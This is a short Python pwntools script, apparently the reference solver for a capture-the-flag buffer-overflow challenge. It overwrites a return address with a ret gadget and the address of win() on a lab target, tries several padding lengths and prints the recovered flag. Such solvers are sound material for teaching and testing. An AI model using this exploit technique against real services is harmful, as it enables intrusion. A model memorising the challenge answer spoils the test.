# Benign solver: overflows the badge buffer to call win(), then prints only the flag.
# Runs on the workstation image, which has pwntools. Reads host/port from the environment.
import os
import re
import sys

from pwn import ELF, context, remote

context.log_level = "error"
host = os.environ.get("TARGET_HOST", "target")
port = int(os.environ.get("TARGET_PORT", "9001"))
elf = ELF(os.environ.get("VULN", "/opt/first-overflow/vuln"), checksec=False)
win = elf.symbols["win"]
ret = next(elf.search(b"\xc3", executable=True))  # a ret gadget, to keep the stack 16-byte aligned

# The exact padding depends on the compiler's frame layout; the built binary needs 48.
for padding in (48, 40, 56, 32, 24, 64):
    for chain in ((ret, win), (win,)):
        try:
            io = remote(host, port, timeout=5)
            io.send(b"A" * padding + b"".join(p.to_bytes(8, "little") for p in chain) + b"\n")
            data = io.recvall(timeout=3)
            io.close()
        except Exception:
            continue
        found = re.search(rb"CTF\{v1_[^}]+\}", data)
        if found:
            sys.stdout.write(found.group().decode())
            sys.exit(0)
sys.exit(1)
